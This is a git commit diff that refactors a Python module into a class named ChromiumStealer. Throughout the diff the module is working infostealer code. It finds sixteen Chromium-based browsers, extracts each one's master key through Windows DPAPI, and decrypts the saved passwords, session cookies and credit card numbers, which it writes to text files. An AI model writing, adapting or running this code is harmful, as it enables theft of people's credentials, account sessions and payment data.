fa2efe415a249021bb0b6dd7c4bab4194ece70c2
Hirusha Adikari <36286877+hirusha-adi@users.noreply.github.com>
2023-02-14 18:48:48 +0530

    add to class

--- modules/browsers/chromium.py
+++ modules/browsers/chromium.py
@@ -26,6 +26,8 @@ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 """
 
+
+
 import os
 import json
 import base64
@@ -35,168 +37,172 @@ from Crypto.Cipher import AES
 import shutil
 from datetime import datetime
 
-appdata = os.getenv('LOCALAPPDATA')
+from config.manager import ModuleManager
+class ChromiumStealer(ModuleManager):
+    
+    def __init__(self) -> None:
+        super().__init__(module_name="ChromiumStealer")
 
-browsers = {
-    'amigo': appdata + '\\Amigo\\User Data',
-    'torch': appdata + '\\Torch\\User Data',
-    'kometa': appdata + '\\Kometa\\User Data',
-    'orbitum': appdata + '\\Orbitum\\User Data',
-    'cent-browser': appdata + '\\CentBrowser\\User Data',
-    '7star': appdata + '\\7Star\\7Star\\User Data',
-    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
-    'vivaldi': appdata + '\\Vivaldi\\User Data',
-    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
-    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
-    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
-    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
-    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
-    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
-    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
-    'iridium': appdata + '\\Iridium\\User Data',
-}
+        appdata = os.getenv('LOCALAPPDATA')
+        self.browsers = {
+            'amigo': appdata + '\\Amigo\\User Data',
+            'torch': appdata + '\\Torch\\User Data',
+            'kometa': appdata + '\\Kometa\\User Data',
+            'orbitum': appdata + '\\Orbitum\\User Data',
+            'cent-browser': appdata + '\\CentBrowser\\User Data',
+            '7star': appdata + '\\7Star\\7Star\\User Data',
+            'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
+            'vivaldi': appdata + '\\Vivaldi\\User Data',
+            'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
+            'google-chrome': appdata + '\\Google\\Chrome\\User Data',
+            'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
+            'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
+            'uran': appdata + '\\uCozMedia\\Uran\\User Data',
+            'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
+            'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+            'iridium': appdata + '\\Iridium\\User Data',
+        }
 
+    def get_master_key(self, path: str):
+        if not os.path.exists(path):
+            return
 
-def get_master_key(path: str):
-    if not os.path.exists(path):
-        return
+        if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
+            return
 
-    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
-        return
+        with open(path + "\\Local State", "r", encoding="utf-8") as f:
+            c = f.read()
+        local_state = json.loads(c)
 
-    with open(path + "\\Local State", "r", encoding="utf-8") as f:
-        c = f.read()
-    local_state = json.loads(c)
-
-    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    master_key = master_key[5:]
-    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-    return master_key
-
-
-def decrypt_password(buff: bytes, master_key: bytes) -> str:
-    iv = buff[3:15]
-    payload = buff[15:]
-    cipher = AES.new(master_key, AES.MODE_GCM, iv)
-    decrypted_pass = cipher.decrypt(payload)
-    decrypted_pass = decrypted_pass[:-16].decode()
-
-    return decrypted_pass
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
 
 
-def save_results(browser_name, data_type, content):
-    if not os.path.exists(browser_name):
-        os.mkdir(browser_name)
-    if content is not None:
-        open(f'{browser_name}/{data_type}.txt', 'w').write(content)
-        print(f"\t [*] Saved in {browser}/{data_type}.txt")
-    else:
-        print(f"\t [-] No Data Found!")
+    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+
+        return decrypted_pass
 
 
-def get_login_data(path: str, profile: str, master_key):
-    login_db = f'{path}\\{profile}\\Login Data'
-    if not os.path.exists(login_db):
-        return
-    result = ""
-    shutil.copy(login_db, 'login_db')
-    conn = sqlite3.connect('login_db')
-    cursor = conn.cursor()
-    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-    for row in cursor.fetchall():
-        password = decrypt_password(row[2], master_key)
-        result += f"""
-        URL: {row[0]}
-        Email: {row[1]}
-        Password: {password}
-        
-        """
-    conn.close()
-    os.remove('login_db')
-    return result
+    def save_results(self, browser_name, data_type, content):
+        if not os.path.exists(browser_name):
+            os.mkdir(browser_name)
+        if content is not None:
+            open(f'{browser_name}/{data_type}.txt', 'w').write(content)
+            print(f"\t [*] Saved in {browser}/{data_type}.txt")
+        else:
+            print(f"\t [-] No Data Found!")
 
 
-def get_credit_cards(path: str, profile: str, master_key):
-    cards_db = f'{path}\\{profile}\\Web Data'
-    if not os.path.exists(cards_db):
-        return
-
-    result = ""
-    shutil.copy(cards_db, 'cards_db')
-    conn = sqlite3.connect('cards_db')
-    cursor = conn.cursor()
-    cursor.execute(
-        'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
-    for row in cursor.fetchall():
-        if not row[0] or not row[1] or not row[2] or not row[3]:
-            continue
-
-        card_number = decrypt_password(row[3], master_key)
-        result += f"""
-        Name On Card: {row[0]}
-        Card Number: {card_number}
-        Expires On:  {row[1]} / {row[2]}
-        Added On: {datetime.fromtimestamp(row[4])}
-        """
-
-    conn.close()
-    os.remove('cards_db')
-    return result
+    def get_login_data(self, path: str, profile: str, master_key):
+        login_db = f'{path}\\{profile}\\Login Data'
+        if not os.path.exists(login_db):
+            return
+        result = ""
+        shutil.copy(login_db, 'login_db')
+        conn = sqlite3.connect('login_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+        for row in cursor.fetchall():
+            password = self.decrypt_password(row[2], master_key)
+            result += f"""
+            URL: {row[0]}
+            Email: {row[1]}
+            Password: {password}
+            """
+        conn.close()
+        os.remove('login_db')
+        return result
 
 
-def get_cookies(path: str, profile: str, master_key):
-    cookie_db = f'{path}\\{profile}\\Network\\Cookies'
-    if not os.path.exists(cookie_db):
-        return
-    result = ""
-    shutil.copy(cookie_db, 'cookie_db')
-    conn = sqlite3.connect('cookie_db')
-    cursor = conn.cursor()
-    cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
-    for row in cursor.fetchall():
-        if not row[0] or not row[1] or not row[2] or not row[3]:
-            continue
+    def get_credit_cards(self, path: str, profile: str, master_key):
+        cards_db = f'{path}\\{profile}\\Web Data'
+        if not os.path.exists(cards_db):
+            return
 
-        cookie = decrypt_password(row[3], master_key)
+        result = ""
+        shutil.copy(cards_db, 'cards_db')
+        conn = sqlite3.connect('cards_db')
+        cursor = conn.cursor()
+        cursor.execute(
+            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2] or not row[3]:
+                continue
 
-        result += f"""
-        Host Key : {row[0]}
-        Cookie Name : {row[1]}
-        Path: {row[2]}
-        Cookie: {cookie}
-        Expires On: {row[4]}
-        """
+            card_number = self.decrypt_password(row[3], master_key)
+            result += f"""
+            Name On Card: {row[0]}
+            Card Number: {card_number}
+            Expires On:  {row[1]} / {row[2]}
+            Added On: {datetime.fromtimestamp(row[4])}
+            """
 
-    conn.close()
-    os.remove('cookie_db')
-    return result
-
-
-
-def installed_browsers():
-    results = []
-    for browser, path in browsers.items():
-        if os.path.exists(path):
-            results.append(browser)
-    return results
+        conn.close()
+        os.remove('cards_db')
+        return result
 
 
-if __name__ == '__main__':
-    available_browsers = installed_browsers()
+    def get_cookies(self, path: str, profile: str, master_key):
+        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
+        if not os.path.exists(cookie_db):
+            return
+        result = ""
+        shutil.copy(cookie_db, 'cookie_db')
+        conn = sqlite3.connect('cookie_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2] or not row[3]:
+                continue
 
-    for browser in available_browsers:
-        browser_path = browsers[browser]
-        master_key = get_master_key(browser_path)
-        print(f"Getting Stored Details from {browser}")
+            cookie = self.decrypt_password(row[3], master_key)
 
-        print("\t [!] Getting Saved Passwords")
-        save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
-        print("\t------\n")
+            result += f"""
+            Host Key : {row[0]}
+            Cookie Name : {row[1]}
+            Path: {row[2]}
+            Cookie: {cookie}
+            Expires On: {row[4]}
+            """
 
-        print("\t [!] Getting Cookies")
-        save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))
-        print("\t------\n")
+        conn.close()
+        os.remove('cookie_db')
+        return result
 
-        print("\t [!] Getting Saved Credit Cards")
-        save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))
+
+
+    def installed_browsers(self):
+        results = []
+        for browser, path in self.browsers.items():
+            if os.path.exists(path):
+                results.append(browser)
+        return results
+    
+    def run(self):
+        available_browsers = self.installed_browsers()
+        for browser in available_browsers:
+            browser_path = self.browsers[browser]
+            master_key = self.get_master_key(browser_path)
+            print(f"Getting Stored Details from {browser}")
+
+            print("\t [!] Getting Saved Passwords")
+            self.save_results(browser, 'Saved_Passwords', self.get_login_data(browser_path, "Default", master_key))
+            print("\t------\n")
+
+            print("\t [!] Getting Cookies")
+            self.save_results(browser, 'Browser_Cookies', self.get_cookies(browser_path, "Default", master_key))
+            print("\t------\n")
+
+            print("\t [!] Getting Saved Credit Cards")
+            self.save_results(browser, 'Saved_Credit_Cards', self.get_credit_cards(browser_path, "Default", master_key))
+
+
+    
         
